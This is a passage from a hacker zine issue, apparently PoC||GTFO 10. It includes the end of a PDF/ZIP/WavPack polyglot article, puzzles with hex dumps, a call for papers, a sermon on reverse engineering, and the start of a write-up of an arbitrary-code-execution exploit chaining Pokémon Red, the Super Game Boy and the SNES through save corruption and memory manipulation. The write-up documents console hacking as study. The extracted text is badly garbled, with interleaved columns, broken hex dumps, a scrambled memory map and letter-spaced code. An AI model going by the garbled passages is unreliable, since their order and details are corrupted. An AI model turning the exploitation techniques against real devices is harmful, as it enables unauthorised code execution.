The WavPack file format 32 is quite unusual, but far more friendly to us: it doesn’t have a file header,
but every block starts with the same magic wvpk. We can add new metadata blocks at the beginning of the
file, and they support DUMMY sub-blocks, meant for padding. So we can inject the beginning of a PDF, but
can we use those sub-blocks to inject the full PDF in our WavPack? For each sub-block the theoretical size
is 16 Mb, but in practice MPlayer accepts a maximum of 1,047,548 bytes and VLC 1,048,548 bytes and only
one such sub-block per block. So it’s possible, but it would be quite impractical to slice the PDF in 1Mb
chunks. WavPack also supports ID3v1 and APEv2. ID3v1 is too limited (only ID3v2 allows PRIV frames),
so we have to rely on APEv2 to inject the bulk of the PDF (and ZIP, as usual) in a large metadata frame.
We now have the ingredients to
build a PDF/ZIP/WavPack polyglot
file. The final file structure, from the
three perspectives, is depicted on the
right.
All starred items contain a size
or an offset that depends on another
part of the polyglot, so the file is
built in two passes. The first pass
puts the elements together, and then
the second pass adjusts those fields
in the WavPack and ZIP.
WavPack
PDF
ZIP
By the way, the artwork on page 60 is by Ange and myself, derived from Vectorportal’s artwork 33 licensed
under a Creative Commons Attribution 3.0 Unported License.
30 http://en.true-audio.com/TTA_Lossless_Audio_Codec_-_Format_Description
31 http://wiki.hydrogenaud.io/index.php?title=APEv2_specification
32 http://www.wavpack.com/file_format.txt
33 http://www.vecteezy.com/people/23511-marilyn-monroe-vector
6113
Oona’s Puzzle Corner!
by Oona Räisänen
13.1
Mystery Message
Peter sits in the front of the classroom. One day during class this message was passed to him.
What’s it about and who might have sent it?
13.2
Bit Flip Trouble
Mary keeps two copies of a precious file. But one of the copies has been corrupted in memory due to a recent
Rowhammer attack. Can you find all the flipped bits in the samples below? Can you even tell which one is
the original?
0000000:
0000010:
0000020:
0000030:
0000040:
0000050:
0000060:
0000070:
0000080:
0000090:
00000a0:
00000b0:
00000c0:
00000d0:
00000e0:
00000f0:
0000100:
0000110:
0000120:
0000130:
0000140:
0000150:
0000160:
0000170:
0000180:
0000190:
00001a0:
2550
0a3c
6f67
3e3e
6a0a
6573
205d
6e64
202f
7265
7572
3c20
466f
7970
4172
436f
3e0a
0a3c
2f46
2054
793a
282d
3020
7665
6561
6572
523e
4446
3c20
202f
0a65
3c3c
202f
202f
6f62
5479
6e74
6365
2f46
6e74
6531
6961
6e74
656e
3c3e
3120
640a
2920
2044
5464
2920
6d0a
0a3c
3e0a
2d31
2f54
5061
6e64
202f
4b69
436f
6a0a
7065
2032
7320
3120
202f
202f
6c20
656e
646f
3e0a
3430
2853
546a
4452
0a28
546a
656e
3c20
2525
2e33
7970
6765
6f62
5479
6473
756e
3320
202f
2030
3c3c
3c3c
5375
4261
3e3e
7473
626a
7374
2054
7475
0a30
3429
2d20
0a45
646f
2f52
454f
0a31
6520
7320
6a0a
7065
205b
7420
3020
5061
2052
202f
202f
6274
7365
203e
2034
0a34
7265
660a
6666
202d
2054
6861
540a
626a
6f6f
460a
2030
2f43
3220
3220
7320
2033
3120
6f62
6765
202f
466f
5479
7970
466f
3e20
2030
2030
616d
3430
2074
3830
6a0a
7264
656e
0a74
7420
206f
6174
3020
3020
2f50
2030
3e3e
6a0a
202f
5265
6e74
7065
6520
6e74
3e3e
2052
206f
0a42
2037
6f20
2054
3020
2064
6473
7261
3120
626a
616c
5220
6f62
6167
2052
0a65
3c3c
5061
736f
203c
202f
2f54
202f
202f
203e
626a
540a
3030
6275
640a
2d38
7269
7472
696c
3020
Hint: !noisiv oerets ruoy esU
62
2550
0a3c
6f67
3e3e
6a0a
6573
205d
6e64
202f
7265
7572
3c20
466f
7971
4172
436f
3e0a
0a3c
2f06
2054
793a
082d
3020
7665
6561
6572
523e
4446
3c20
a02f
0a65
3c3c
202f
202f
6f66
5479
6e74
6365
2f46
6e74
6531
6961
6e74
656e
3c3e
3120
640a
2920
2044
5474
2921
6d0a
0a3c
3e0a
2d31
2f44
5061
6e64
a02f
4b69
436f
6a0a
7065
2032
7321
3120
202f
202f
6c20
256e
646f
3e0a
3430
2853
546a
4452
0a28
546a
656e
3c20
2525
2e33
7970
6765
6f62
5479
6473
756e
3320
202f
2030
3c3c
3c3c
5375
4261
3e3e
7473
626a
7374
2044
7475
0a30
3329
2d20
0a65
e46f
2f56
454f
0a31
6520
7320
6a0a
7065
205b
7420
3020
5061
2052
202f
202f
6274
7365
203e
2034
0a34
7265
620a
6666
202d
2054
6861
540a
626a
6f6f
460a
2030
2f4b
3220
3220
7321
2033
3120
6f62
6765
202f
466f
5479
7970
466f
3e20
2030
2030
616d
3430
2074
3830
6a0a
7264
656e
0a74
7420
a06f
6174
3020
3020
2f50
2030
3e3e
6e0a
202f
5245
6e74
7065
6521
6e64
3e3e
2056
206f
0a42
2037
6f20
2054
3020
2064
6473
7261
3120
626a
616c
5220
6f62
6167
2052
0a65
3c3c
5061
f36f
203c
202f
2f54
202f
202f
203e
626a
540a
3030
6275
640a
2d38
7269
7472
696c
302013.3
Interpolation Colorization
Sadie really likes to convolve with this kernel. But she only took with her a travel pack containing a limited
set of discrete samples. Use a colored pencil to connect the integer-valued dots (1, 2, 3, ...). Then repeat
using a different color but include also the decimal-valued dots. What do you see? How is this related to
interpolation and sampling rates? If you recognize the kernel, how would you help Sadie generate even more
points?
13.4
Hacker Jumble
Max has been trying to memorize some topical words for his upcoming infosec specialist appearance in the
news. But now they’re all lying on his hotel room floor and he has trouble finding them. How many words
can you find? What has happened to them during the night that makes them so difficult to see?
F
U
N
P
F
R
R
F
H
T
O
R
V
U
V
F
H
N
Y
Q
R
J
B
R
A
F
Q
N
B
V
N
J
R
B
L
G
Y
Y
W
Y
O
P
G
S
E
F
U
E
Z
Y
N
Q
R
H
S
X
F
E
A
N
E
A
E
J
Q
R
R
Q
E
V
N
R
F
J
U
V
Q
A
H
U
C
F
R
A
G
C
N
J
L
V
R
Z
A
G
U
F
N
T
U
H
G
E
B
J
U
N
Z
Z
R
E
X
G
63
A
F
R
R
R
Z
N
W
T
B
Y
G
B
R
O
E
R
B
Z
E
R
Q
C
Y
Q
R
B
N
E
G
U
S
B
E
E
F
V
E
V
B
G
Z
B
E
N
P
Y
R
S
N
A
S
V
P
Y
G
B
N
F
U
Y
R
L
Z
N
Q
V
F
B
A
R
F
X
V
N
R
A
C
G
N
E
E
Q
V
B
Z
J
V
A
Q
B
J
F
G
R
A
N
A14
Fast Cash for Cyber Munitions!
by Pastor Manul Laphroaig,
Unlicensed Proselytizer
International Church of the Weird Machines
Do this: write an email telling our editors how to
do reproduce ONE clever, technical trick from your
research. If you are uncertain of your English, we’ll
happily translate from French, Russian, Southern
Appalachian and German. If you don’t speak those
languages, we’ll draft a translator from those poor
sods who owe us favors.
Like an email, keep it short. Like an email, you
should assume that we already know more than a
bit about hacking, and that we’ll be insulted or—
WORSE!—that we’ll be bored if you include a long
tutorial where a quick reminder would do.
Just use 7-bit ASCII if your language doesn’t
require funny letters, as whenever we receive some-
thing typeset in OpenOffice, we briefly mistake it
for a ransom note. Don’t try to make it thorough
or broad. Don’t use bullet-points, as this isn’t a
damned Powerpoint deck. Keep your code samples
short and sweet; we can leave the long-form code as
an attachment. Do not send us L A TEX; it’s our job
to do the typesetting!
Do pick one quick, clever low-level trick and ex-
plain it in a few pages. Teach me how to turn Davis-
son’s benign tumor from page 26 into a malignant
tumor. Teach me how to scan the entire APRS-IS
network for Vogelfrei’s tricks from page 34. Don’t
tell me that it’s possible; rather, teach me how to
do it myself with the absolute minimum of formality
and bullshit.
Like an email, we expect informal (or faux-
biblical) language and hand-sketched diagrams.
Write it in a single sitting, and leave any editing
for your poor preacherman to do over a bottle of
fine scotch. Send this to pastor@phrack org and
hope that the neighborly Phrack folks—praise be to
them!—aren’t man-in-the-middling our submission
process.
Howdy, neighbor!
Are you one of those merchants of cyber-death
that certain Thought Leading Technologists keep
warning us about? Have you been hoarding bugs
instead of sharing them with the world? Well, at
this church we won’t judge you, but we’d be happy
to judge your proofs of concept, sharing the best
ones with our beloved readers.
So set that little PoC free, neighbor, and let it
come to me, pastor@phrack org!
Yours in PoC and Pwnage,
Pastor Manul Laphroaig, D.D.
64PoC k GTFO
IN THE THEATER OF LITERATE DISASSEMBLY,
PASTOR MANUL LAPHROAIG
AND HIS MERRY BAND OF
REVERSE ENGINEERS
LIFT THE WELDED HOOD FROM
THE ENGINE THAT RUNS THE WORLD!
10:3 Exploiting Pokémon in a Super GameBoy 10:6 Reversing a Pregnancy Test
10:4 Pokéglot! 10:7 Apple ][ Copy Protections
10:5 Cortex M0 Marionettes with SWD 10:8 Jailbreaking the Tytera MD380
Washington, District of Columbia
Funded by Single Malt as Midnight Oil and the
Tract Association of PoCkGTFO and Friends,
to be Freely Distributed to all Good Readers, and
to be Freely Copied by all Good Bookleggers.
Это самиздат. He who has eyes to read, let him read!
0, $0 USD, £0, 0 RSD, 0 SEK, $50 CAD. pocorgtfo10.pdf. January 16, 2016.
1Legal Note: The buying party agrees that Pastor Manul Laphroaig and his merry band of Reverse Engi-
neers lift the hood from the Engine That Runs the World must be copied and shared with all neighbors, as
defined by previously agreed-upon language, until the year 2104. The buying party also agrees that, at any
time during the stipulated 88 year period, the seller may legally plan and attempt to execute one (1) heist
or caper to steal back this issue of PoCkGTFO, which, if successful, would return all ownership rights to
the seller. Said heist or caper can only be undertaken by currently active clergy of the Church of the Weird
Machines and/or neighbor Dan Kaminsky, with no legal repercussions.
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t deserve. Please
mirror–don’t merely link!–pocorgtfo10.pdf and our other issues far and wide, so our articles can help fight
the coming robot apocalypse. We like the following mirrors.
https://pocorgtfo.hacke.rs/
https://www.alchemistowl.org/pocorgtfo/
http://www.sultanik.com/pocorgtfo/
http://openwall.info/wiki/people/solar/pocorgtfo
Technical Note: The polyglot file pocorgtfo10.pdf is valid as a PDF, as a ZIP file, and as an LSMV
recording of a Tool Assisted Speedrun (TAS) that exploits Pokémon Red in a Super GameBoy on a Super
NES. The result of the exploit is a chat room that plays the text of PoCkGTFO 10:3.
Run it in LSNES with the Gambatte plugin, the Japanese version of the Super Game Boy ROM and the
USA/Europe version of Pokémon Red.
. / l s n e s −−l i b r a r y=gambatte / c o r e . s o
Printing Instructions: Pirate print runs of this journal are most welcome! PoCkGTFO is to be printed
duplex, then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”) paper
in Samland. Secret government labs in Canada may use P3 (280 mm x 430 mm) if they like. The outermost
sheet should be on thicker paper to form a cover.
# This is how to convert an issue for duplex printing.
sudo apt-get install pdfjam
pdfbook --short-edge --vanilla --paper a3paper pocorgtfo10.pdf -o pocorgtfo10-book.pdf
Preacherman
Ethics Advisor
Poet Laureate
Editor of Last Resort
L A TEXnician
Editorial Whipping Boy
Funky File Formats Polyglot
Assistant Scenic Designer
Minister of Spargelzeit Weights and Measures
2
Manul Laphroaig
The Grugq
Ben Nagy
Melilot
Evan Sultanik
Jacob Torrey
Ange Albertini
Philippe Teuwen
FX1
Please stand; now, please be seated.
Neighbors, please join me in reading this
eleventh release of the International Journal of Proof
of Concept or Get the Fuck Out, a friendly little col-
lection of articles for ladies and gentlemen of distin-
guished ability and taste in the field of software ex-
ploitation and the worship of weird machines. This
is our eleventh release, given on paper to the fine
neighbors of Washington, D.C.
If you are missing the first ten issues, we the edi-
tors suggest pirating them from the usual locations,
or on paper from a neighbor who picked up a copy of
the first in Vegas, the second in São Paulo, the third
in Hamburg, the fourth or eighth in Heidelberg, the
fifth in Montréal, the sixth in Las Vegas, the sev-
enth from his parents’ inkjet printer, the ninth in
Montréal, or the tenth in Novi Sad or Stockholm.
Our sermon today, to be found on page 4, is a
sordid tale in the style of a Dickensian ghost story.
Pastor Laphroaig invites us to the anatomical the-
ater, where helpless tamagotchis are disassembled in
front of an audience, for FUN!
Page 7 contains a delightfully sophisticated and
reliable exploit for Pokémon Red on the Super
GameBoy, starting from a save-game glitch, then
working forward through native Z80 code execution
to native 65C816 code on the host Super NES. They
do all of this on real hardware with scripted access
to only the gamepad and the reset switch!
Keeping up our tradition of shipping in funky
file formats, this PDF is a new polyglot! Page 24
contains the details for how this PDF is also an ex-
ploit, loading Pokémon Plays Twitch in the Lsnes
emulator.
Micah Elizabeth Scott is becoming a regular con-
tributor to this journal, and we eagerly await each
of her submissions. Page 26 contains her notes on
ARM’s replacement for JTAG, called Single Wire
Debug or SWD. Driving SWD from an Arduino,
she’s able to move the target machine like a mari-
onette, scripted from literate HTML5 programming
with powerful new elements such as swd-hexedit.
When we heard that Amanda Wozniak was con-
tracted to reverse engineer a pregnancy test, but
never paid for the work, we quickly scrounged up five
Canadian loonies to buy the work as scrap. Page 32
contains her notes, and we’ll happily pay five more
loonies to the first use of this technology in a Hack-
aday marriage proposal or shotgun wedding.
On page 39, Peter Ferrie shares tricks for break-
ing the copy protection of dozens of Apple ][ games.
When we told Peter to keep his notes to six pages,
he laughed and dared us to find tricks worth cut-
ting from his article. Accordingly, our cutting-room
floor is empty and this article is the most complete
collection of Apple ][ cracking techniques in modern
publication.
Travis Goodspeed has been playing with Dig-
ital Mobile Radio (DMR) lately, a competitor to
TETRA and P25 that is used for amateur ra-
dio, as well as trunked radio for businesses and
cash-strapped police departments. Page 76 con-
tains his notes for jailbreaking the Tytera MD380’s
bootloader, dumping all of protected memory, then
patching its application to enable promiscuous
mode. These tricks should also work on the CS700,
CS750, and a variety of other DMR handhelds.
On page 88, the last and most important page,
we pass around the collection plate. We don’t need
your dimes, but we’d love some nifty proofs of con-
cept.
32
Three Ghosts and a Little, Brown Dog
a sermon by Pastor Manul Laphroaig
Rise, neighbors, and in the tradition of the sea-
son, let’s have a conversation with spirits of the past,
the present, and the future. We will head to a dis-
reputable place, a place of controversy where, ac-
cording to the best moral authorities, irresponsible
people do foul things for fun—a place of scandalous,
wholesale wickedness which must be stopped!
certing breakage and cutting things off. Truly, if this
doesn’t beg the question of “How is this allowed?”
then what does?
There was a time, neighbors, when anatomy
didn’t mean trying to guess how a thing functioned
by dissecting a specimen. When Andreas Vesal-
ius published his classic human anatomy atlas with
its absolute priority of dissection for learning what
was and what was not true about the human body,
his fixation on biological disassembly was a scandal.
A proper anatomy book was understood to include
Aristotle’s four humors and a fair bit of astrology;
imagine how regressive Vesalius’ fixation on cutting
things apart to find their function must have looked!
Even when he became a royal court physician, other
learned physicians called him a barber—for everyone
knew that only barbers and sawbones used blades.
Until Victorian times, a doctor was a gentleman,
Yes, neighbors, we are heading to an anatom-
ical theater, to observe its grim denizens at their
grisly pastime. While some dissect carcasses, the
rest watch from rows of seats. They call it learn-
ing and finding things out—even though most of
what meets the eye looks like merely breaking things
apart. They say they are making things better—
even curing diseases!—though there are highly titled
authorities with certified diplomas and ethically ap-
proved methodologies who make it their business to
improve things “holistically,” without all this discon-
4and a surgeon wasn’t. Testing the patient’s urine
was fine, but taking knives to one was simply below
a proper doctor’s station.
So says the Ghost of Science Past, but we bid
him to haunt us no longer. There is another, more
cheerful Spirit to occupy our attention—the Spirit of
the Present. This is a more cheerful Spirit, involv-
ing pets only as cute pictures thereof—and lots of
them!—much to the relief of those who think neither
Schrödinger nor Pavlov would make good friends.
But this Spirit isn’t left without attention from
our moral betters. What about the children? What
about the lowlives and the criminals whom we em-
power by our so-called knowledge? What about
the bullies, the haters, the thieves, the spies, the
despots, and even—the terrorists? Would a good
thing be called exploitation or pwnage? This new
reality is so scary to some people that their response
goes straight to nuclear; they call for a Manhattan
project, but what they really mean is “nuke it from
orbit.” To some, it’s even about evil “techno-priests”
hijacking “true social progress”—or at least it sells
their books.
Nor is this Spirit’s domain devoid of court
drama, even in our enlightened times—although
looking where we tend to fall on the scale between
Vesalius and Lord Alverstone’s Old Bailey, one be-
gins to wonder just where the light is going. No
wonder the Spirit of the Hacking Present looks some-
what frayed around the edges.
Why wait for the Specter of the Future to make
an appearance? I say, neighbors, let’s make like 1594
at the University of Padua—back when a university
used to have quite a different place in this game of
ghosts—and have our own Anatomical Theater, a
Theater of Literate Disassembly!
Just as Knuth described Adventure with Liter-
ate Programming, 1 we’ll weave together the disas-
sembled code of a live subject with expert explana-
tions of its deeper meaning. (Of course the best part
might well be a one liner, but we’ll save the reader
hours of effort!) We’ll weave a log and a transcript
into an executable script that reproduces the cuts of
a Master Surgeon, stroke by stroke.
It is high time. We have been doing our dissec-
tions alone—with none or few to watch and learn—
long enough. Let other neighbors watch your disas-
sembly, show them your technique, and let them get
a good view and share the fun.
As the good old U. of Padua preserved its the-
ater, so shall we! And then perhaps the Specter of
the Future will smile upon us.
Vesalius’ dissection-bound atlas became an in-
stant hit, though. It turned out that going into spe-
cific techniques of dissection—place a rope here and
a pulley there—so that others would replicate it was
exactly what was needed; the venerable signs and el-
ements, on the other hand, not so much. Which did
not save Vesalius from having to undertake an emer-
gency trip to far-away lands for an obscure reason,
dying in abject poverty on the way. He died before
the first dedicated anatomical theater was built in
1594, by which time anatomy finally meant what he
had made it mean.
Ah, but that was then and now is now! The
year is 1902, and physiology is the latest scandal.
Again, moral delinquents and their supporters are
doing something loathsome: vivisection. Again,
they come up with excuses: it’s all about finding
out how things work, they say; some kind of knowl-
edge that makes them different from the uninitiated,
we hear. And even if there was knowledge to be
gained, could it really be trusted to such an imma-
ture and irresponsible crowd? Stuck to their—not
so innocent—toys and narrowly focused views, they
can’t even see the bigger ethical picture! They cater
to and are occasionally catered by truly objection-
able characters—and then have the gall to shrug it
off. They talk about education, but who in their
right mind would let them near children? Too bad
there isn’t a general law against them yet, and the
establishment is dragging its feet (or even has its
own uses for them, no doubt disgusting)—but the
stride of social progress is catching up with them,
and, with luck, there soon will be!
That was the year of high court drama, a pitched
battle between people who each believed to em-
body “social progress” against “superstition” on both
sides. It saw rallies by socialists and riots by medi-
cal students, scientists and suffragettes, British lords
and Swedish feminists—and a lot more, including
its own commemorative handkerchief merchandise.
It is immortalized in history as The Brown Dog af-
fair, one so dramatic that even the Wikipedia arti-
cle about it makes for good reading. Incidentally,
the experiment involved led to the discovery of hor-
mones.
1 unzip
pocorgtfo10.pdf adventure.pdf
5Stage 0: Inject
useful data by
naming the
rival RxRx PK and
resetting while
saving to get
255 Pokemon.
Stage 1: Swap Pokemon
and items to get rival's
name in items list, toss
items to form a button
reading
payload,
and
leave menu to execute it.
Stage 2: Press buttons to
write
two
command
packets in memory one
nibble per frame, overwrite
jump to execute.
Stage 4: At 3,840 bytes per
second (4 controllers of 2
bytes at 60 frames per
seconds), write a block
transfer loader into memory
and execute it.
Stage 3: Escape SGB, hang
Pokemon to stop music,
read a set number of
button presses 1 byte per
frame to write a faster
transfer
method
and
execute it.
Stage 5: Use block loader to
transfer intended SNES
payload of variable length
and execute it.
Stage 6: Reset SNES to
clear
state,
execute
Twitch chat interface,
read text in 5-bit or 7-bit
encodings, respond to
control
packets
to
display web view, make
Twitch chat say Hi, win
the Internet.
63
Pokémon Plays Twitch
by Allan Cecil (dwangoAC), Ilari Liusvaara (Ilari) and Jordan Potter (p4plus2)
controls such as slow motion and frame advance,
along with the ability to save and restore the state
of the game (or, rather, of the entire console) at any
time. TAS movie files consist of a list all of the but-
ton presses sent to the console every frame from the
time it is powered on until the game is beaten. It
aids our poor human reflexes, but it can do a lot
more—like arbitrary code execution!
The first run on the site to use this ability to
execute arbitrary code to jump to the credits of
a game was Masterjun’s Super Mario World run.
Later, Bortreb used arbitrary code execution in a
run of Pokémon Yellow, marking the first time ex-
ternal content was added to an existing game.
In late 2013, dwangoAC worked with Ilari and
Masterjun to present a run at AGDQ 2014 that
programmed the games Snake and Pong into Super
Mario World on a real console using a replay device
(also known as a “bot”) from True. 3 This was a huge
success and was covered by Ars Technica, but we
knew that we could do even more, which ultimately
led us to the project described in this article. 4
For the Awesome Games Done Quick (AGDQ)
2015 charity marathon we exploited a chain of un-
modified Nintendo game console components con-
sisting of a Pokémon Red Game Boy cartridge in a
Super Game Boy running in a Super Nintendo. We
plugged the latter into custom hardware posing as
a normal controller. In this seven-stage exploit, we
corrupted a save file to give ourselves 255 Pokémon,
swapped Pokémon, and tossed items to plant shell-
code. We committed a series of atrocities using
documented command packets and ultimately broke
into the Super Nintendo’s working RAM, where we
wrote our own chat interface to display live contents
of the Twitch chat and even a representation of a de-
faced website.
3.1
3.2
The Game Choice
We started with an end-goal of executing arbi-
trary code on a Super Nintendo (SNES) using a
Super Game Boy (SGB) cartridge as the entry
point. We initially planned to use Pokémon Yel-
low based on Bortreb’s exploit in that game, but
quickly discovered that the SGB detection routine
used by Pokémon Yellow is extremely broken and
only worked on a real SGB by pure chance. 5 Af-
ter looking at other options, we chose to use the
Pokémon Red version, which uses a more reliable
SGB detection routine that gets us access to the
full SGB palette, a custom border, and consistent
timing benefits we’ll discuss later. 6 Using Pokémon
TAS’ing a Game to execute Ar-
bitrary Code
TASVideos 2 hosts Tool-Assisted Speedruns of
games that are created using an emulator with speed
2 http://tasvideos.org
3 http://truecontrol.org
4 It should also be noted that all recent AGDQ events have directly benefited the Prevent Cancer Foundation which was a
huge motivator for several of us who worked on this project. The block we presented this exploit in at AGDQ 2015 helped raise
over $50K and the marathon as a whole raised more than $1.5M toward cancer research, making this project a huge success on
multiple levels.
5 In brief, the detection routine is extremely sensitive to how many DMG clock cycles various operations take; the emulator
is likely slightly inaccurate, which causes the detection to fail, but from looking at the behavior it seems like it “just works” on
the real hardware. This is sheer luck, and the game developers likely never even knew it was so fragile.
6 If the SGB BIOS does not find the special codes in the DMG game header that indicate it’s an SGB-enabled game ($146
equal to $03), it locks up the command channel until the game is reset, rendering any SGB based exploitation impossible. See
http://gbdev.gg8.se/wiki/articles/The_Cartridge_Header for more details.
7Red also has another added benefit in that the entire
game has been skillfully disassembled. 7
3.3
The Emulator
When we started this project in August 2014, the
only emulator capable of emulating an SGB inside of
an SNES at a low enough level for our needs was the
BSNES emulator. Unfortunately, although BSNES
is very accurate at emulating an SNES, it doesn’t do
a very good job of emulating an SGB. The Gambatte
Dot-Matrix Game Boy (DMG) emulator is likewise
very accurate, but is unable to emulate an SGB on
its own. Ilari was able to create a hybrid emulation
core using BSNES to emulate the SNES↔DMG in-
terface chip while using Gambatte for DMG emula-
tion. This was a considerable undertaking, but in
the end the emulator was very usable, albeit some-
what slow, as properly emulating the synchroniza-
tion between the SNES CPU and the DMG CPU
is a challenge. Ilari continued to provide emulator
development and scripting support throughout the
project.
Figure 1 – The legendary TASBot
3.5
3.4
The Plan
We were initially unsure what kind of payload to
create once we had gained the ability to execute
arbitrary code on the SNES. Initially we investi-
gated methods of showing crude video, but aban-
doned it after spending far too much time failing to
increase the datarate and running into limits with
the processing speed of the SNES’s 65C816 CPU.
An IRC discussion about Twitch Plays Pokémon 9
led dwangoAC and p4plus2 to brainstorm what it
would take to incorporate similar elements into our
payload, and the concept of Pokémon Plays Twitch
was hatched—where a Pokémon character enters a
Twitch chat room and “plays” Twitch. In the end,
we took it to the next level by giving Red a voice in
a chat interface on the SNES and giving TASBot,
the robot holding the replay board, the ability to
speak through espeak and argue with Red. There’s
much more to say about that, but let’s first get to
the point where we can execute arbitrary code!
The Hardware
We didn’t just want to exploit a game in the sandbox
of a console emulator and call it a Proof of Concept.
We wanted to do the job properly and create an ac-
tual exploit that would work on real hardware. Only
one member of our team (dwangoAC) had all of
the required hardware in one place, namely a SNES
console, a SGB cartridge, a copy of Pokémon Red,
and the replay device posing as a controller, also
known as a “bot.” 8 Because we wanted to stream
data from an attached computer, we opted to use
an older, serial-over-USB connected device, namely
True’s NES/SNES Replay Device. This choice of
hardware had a few limitations but worked out well
for the project in the end.
7 unzip
-j pocorgtfo10.pdf pokemon_plays_twitch/pokered-master.zip
term “bot” was originally used because it’s as if you have a robot playing the game for you; dwangoAC later attached
one of these replay devices to a R.O.B. robot as shown in Figure 1 and after presenting Pong and Snake on SMW, the name
TASBot came to be associated with the combination as described at http://tasvideos.org/TASBot.
9 A way of crowdsourcing gameplay by parsing commands sent over IRC.
8 The
83.7
Stage 1: Writing Z80 assembly
by swapping Pokémon and toss-
ing items.
(30 bytes per second.)
After loading the game but before changing any-
thing, the initial state of the GBBUS memory map
is as follows: 11
1 0xD163
3 0xD164
Figure 2 – A strange rival
3.6
Stage 0: Corrupting a save game.
(3–7 bytes per minute.)
5 0xD16A
0xD16B
7
0xD273
9
0xD2B5
11
0xD2F7
13
0xD30A
15
0xD31D
17 0xD31E
19
21 0xD347
Number o f Pokemon caught ,
c o r r u p t e d t o 0xFF i n S t a g e 0 .
Pokemon IDs ( 1 b y t e each ) ,
c o r r u p t e d t o 0xFF .
S e n t i n e l b y t e ( 0 xFF )
Pokemon Data ( 4 4 b y t e s each ) ;
a l l a r e c o r r u p t e d t o 0xFF .
Pokemon o r i g i n a l t r a i n e r s ;
a l l a r e c o r r u p t e d t o 0xFF .
Pokemon nicknames ;
a l l a r e c o r r u p t e d t o 0xFF .
Pokemon owned bitmap ( 1 9 b y t e s ) ;
a l l zeroes .
Pokemon s e e n bitmap ( 1 9 b y t e s ) ;
a l l zeroes .
Number o f i t e m s ; i n i t i a l l y 0
I t e m s a r r a y ; each e n t r y i s 2 b y t e s ,
an item ID and item count .
A f t e r t h e l a s t item , t h e r e i s an FF .
( I n i t i a l l y l o c a t e d a t 0xD31E . )
Money a s Binary−Coded Decimal .
( I n i t i a l l y 00 30 0 0 , $3000 . )
R i v a l ’ s name . ( S e t d u r i n g S t a g e 0 ,
initially
91 F1 91 F1 E1 50 00 00 00 00 0 0 . )
<misc data>
Map l e v e l s c r i p t p o i n t e r .
( I n i t i a l l y B0 4 0 . )
We start the game by creating a save file, giving 23 0xD34A
ourselves the default name of Red and naming our 25
rival RxRx as shown in Figure 2. We then save the
0xD355
game as in Figure 3, but reset the console directly af- 27 0xD36E
ter it starts writing to the cartridge’s SRAM. There
is checksumming on most of the values in the save
file but at least one value has no checksum at all,
namely the byte at the start of the “party data”
We want to adjust some of these values to cre-
that stores the number of Pokémon that have been
ate a payload described in the next section, and the
caught. By some chance, this value in SRAM (at
game conveniently provides three ways to arrange
0xAF2C, or 0x2F2C when paged) is initially set to
the state of memory.
FF, so we wait long enough for valid name data and
a save file header to be written before resetting. It is
• Swapping Pokémon: The game implements
possible to do this with human reflexes as the win-
moving Pokémon around the list by swapping
dow is approximately 20 ms but we opted to run
the raw contents of entries in the ID, Data,
a wire from our replay device to pin 19 on the ex-
Original trainer, and nickname tables, which
pansion port on the underside of the SNES. This
happens to offset data by an odd amount.
allowed us to trigger a reset by shorting the pin to
Since we have 255 Pokémon instead of the 141
ground, as shown in Figure 3. 10
the game was originally limited to we can swap
PK
10 As with many exploits, the seed for this came from Bortreb’s Pokémon Yellow exploit, which itself came from earlier
discoveries of others. Masterjun adapted the exploit for Pokémon Red using the BizHawk DMG emulator and dwangoAC took
this information and made the Stage 0 and Stage 1 movie file in LSNES.
11 The same values can be found in the GBWRAM region at an offset of -0xC000, so the value for 0xD163 in GBBUS (which
isn’t visible in the LSNES memory editor) can instead be found at 0x1163 in GBWRAM. GBBUS addressing is used throughout
for consistency with existing resources such as the pokered disassembly.
12 This means the Pokémon data now extends past end of WRAM, and in fact the WRAM should in effect loop around,
although this isn’t used.
9around the contents of anything in WRAM
above 0xD164. 12
items, but—because we can only ever decrement the
quantity byte in each item’s ID/Quantity two-byte
pair—we have to go back and swap Pokémon to make
what was once an ID into an item count and vice
versa.
• Tossing items: Throwing away unwanted
items decrements the second byte in an item’s
two-byte ID / Quantity pair. Unfortunately,
there are some items that can’t be tossed, ei-
ther because the game prevents tossing them
or because doing so softlocks or crashes the
game.
In order to avoid softlocking the game, we have
to walk through the sequence in a very particular
order. There are several items that the game re-
fuses to toss, some that crash the game if you try to
toss them, some that can only be thrown once—after
which all items afflicted with this condition can no
longer be tossed. Some will crash the game simply
by being in the menu even if you never even select
them.
• Swapping items: Items can be swapped
around in the list of items, which normally
just swaps the item data. If you swap two of
the same item, the game tries to merge them
by adding their counts and then shifting the
item list. The shift adjusts the item count
and writes a new sentinel item ID. (It doesn’t
touch either the item count in that slot or the
old sentinel.)
To work around these pitfalls, we prepare mem-
ory by doing several Pokémon and item swaps fol-
lowed by an initial round of tossing, we go back to
swap Pokémon in a way that realigns memory so we
can now toss what used to be item IDs. We swap
several Pokémon to relocate the Stage 1 code and
create a swath of 0’s in front of it, and at the very
end we swap two identical items to shift memory two
spaces back. That’s a lot to take in in one sentence,
so Figure 4 diagrams the complete list of changes
we make showing the value changes as anchored ini-
tially from GBBUS 0xD349.
Since we don’t have any items, let’s get some!
Swapping the first Pokémon with the tenth causes
the FF’s located at 0xD16B through 0xD196 to be
written to 0xD2F7 through 0xD322. Per the mem-
ory map, the number of items is located at 0xD31D
and this is changed along with lots of other nearby
addresses from 00 to FF, which causes the game to
think we have 255 items. We eventually enter the
item menu and proceed to toss a number of safe
The primary purpose of all this swapping and
tossing is to create a better way to craft our own
13 The swap where j. is swapped with j. involves the pairs 00 00 and 00 F4, but they turn into 00 63 and 00 91 because we
abuse the fact that the game assumes a quantity of 00 is the same as FF and you can only have ninety-nine of any given item
in one slot. This results in FF + F4 = 1F3 which is larger than the sum mod 256 dec., at which point the game stores 63 in one
Figure 3 – Corrupting a save game by pressing A to save, then resetting 24 frames later.
10Address ## ID ## ID ## ID ## ID ## ID ## ID ## ID
0xD34A
Pokemon 1 
item
3 
Pokemon 3 
item
3 
0xD32F
00 91 F1 91 F1 E1 50 00
10 datastart = 0xD349
5 datastart = 0xD347
6 datastart = 0xD331
4 datastart = 0xD32F
00 91 F1 91 F1 E1 50 00
toss 1 item
0xD32F 00 91 F0 91 F1 E1 50 00
toss 1 item
0xD32F 00 91 F0 91 F0 E1 50 00
0xD32F
00 00 00 00 00 00
00 00 00 00 00 00
00 00 00 00 00 00
00 00 00 00 00 00
00 91 F0 E1 50 91 F0 00 00 00 00 00 00 00
0xD32F
